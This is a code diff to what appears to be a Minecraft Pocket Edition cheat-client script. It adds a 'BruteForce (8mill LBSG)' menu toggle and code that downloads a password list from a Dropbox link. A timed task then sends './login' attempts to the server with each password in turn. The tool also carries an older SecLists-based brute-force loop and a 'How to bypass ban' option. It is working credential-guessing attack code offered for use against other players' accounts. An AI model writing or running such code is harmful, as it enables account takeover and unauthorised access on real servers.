@@ -85,6 +85,8 @@ var newnamet = '';
 var checkslapper = false;
 var allDePasswords;
 var numhack3 = 0;
+var fuckdepasswords;
+var numhack4 = 0;
 /*B͎̞̠̠̘̙͈̳͙̳̅͛̽̉͑o̥̤̥̗̥͈̯̯̳̹ͥ̊ͮͭo̠͈̼̱͖̖͂̐̄̉͂͂ͭl͕̰͙̰ͮ̂̐͐͒͂̽̑e̘͈̤̫̟̫̦̞͙̻̲̤͓͓͉̘͇̔̆ͨͧ͊̏̍ͩͥa͕͖͚̟͖̟̫͉̱̗̪͍̾̈́̇̎ͭͭ̈̚ͅͅǹ̫͔̘̤̻̼̫̝͔̙̻͓͕̰͇̘ͮ̂̏̎ͣ̉͛̓ͫ̚ͅs̼͍̤͇̞̝̱͎̺̟͇̮̘̣̪̲̤ͯ̆̂͊͆̾́͐ͨͣ͂ͣ*/
 var abcabc123 = false;
 var liquidwalk = false;
@@ -257,6 +259,7 @@ var sneakspeed1 = false;
 var alwayssneak1 = false;
 var hittp = false;
 var sneakaura2 = false;
+var finalpass = false;
 //ParticleType.angryVillager;
 var particle1 = false;
 //ParticleType.bubble;
@@ -924,6 +927,10 @@ var passurl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/
     var jsoncontent3 = ModPE.getFromUrl(passurl);
     var storpass = jsoncontent3;
     allDePasswords = storpass.split("\n");
+var passurl2 = "https://dl.dropboxusercontent.com/content_link/uDpNoC5Rd6TZbvaMwBcmEL8PS10tTRZmcFzhgBCN72NqxB7FzA0qUfXWawNmjeSo/file";
+    var jsoncontent4 = ModPE.getFromUrl(passurl2);
+    var storpass2 = jsoncontent4;
+    fuckdepasswords = storpass2.split("\n");
 }
 getPasses();
 
@@ -3230,6 +3237,25 @@ function misc_menu() {
 					}
 				});
 				miscLayout.addView(d32icb);
+				var fuckyou = new styleButton();
+				fuckyou.setText("BruteForce (8mill LBSG)");
+				fuckyou.setTextColor(android.graphics.Color.RED);
+				if (finalpass == true) fuckyou.setTextColor(android.graphics.Color.GREEN);
+				fuckyou.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (v) {
+						finalpass ? finalpass = false : finalpass = true;
+						fuckyou.setText("BruteForce (8mill LBSG)");
+						if (finalpass == true) {
+							fuckyou.setTextColor(android.graphics.Color.GREEN);
+							finalpass = true;
+						}
+						if (finalpass == false) {
+							fuckyou.setTextColor(android.graphics.Color.RED);
+							finalpass = false;
+						}
+					}
+				});
+				miscLayout.addView(fuckyou);
 				var ht1 = new styleButton();
 				ht1.setText("How to bypass ban");
 				ht1.setOnClickListener(new android.view.View.OnClickListener() {
@@ -18687,6 +18713,12 @@ function rptask3() {
 							let passwords = allDePasswords[numhack3];
 							Server.sendChat("./login "+passwords);
 							clientMessage(client + "(" + numhack3 + ") "+passwords);
+						}
+						if (finalpass){
+							numhack4++
+							let lbsgpasswords = fuckdepasswords[numhack4];
+							Server.sendChat("./login "+lbsgpasswords);
+							clientMessage(client + "(" + numhack4 + ") "+lbsgpasswords);
 						}
 						nx = getPlayerX();
 						ny = getPlayerY();
